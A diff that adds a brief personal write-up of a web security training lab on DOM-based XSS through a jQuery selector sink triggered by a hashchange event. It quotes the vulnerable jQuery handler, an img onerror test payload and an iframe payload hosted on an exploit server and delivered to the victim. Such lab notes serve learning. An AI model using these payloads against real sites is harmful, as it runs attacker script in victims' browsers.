@@ -1,0 +1,21 @@
+// Lab: DOM XSS in jQuery selector sink using a hashchange event
+
+
+first check the <script> in inspect and debugger 83 line there we find 
+
+$(window).on('hashchange', function() {
+	var element = $(location.hash);
+	element[0].scrollIntoView();
+});
+
+first we inject <img src=x onerror=print()> in url
+
+then I click to exploit server and in body I inject the payload using Iframe
+
+<iframe src="https://web-security-academy.net/#" 
+onload="this.src+='<img src=x onerror=print()>'">
+</iframe>
+
+and deliver it to victim machine
+
+and lab solved
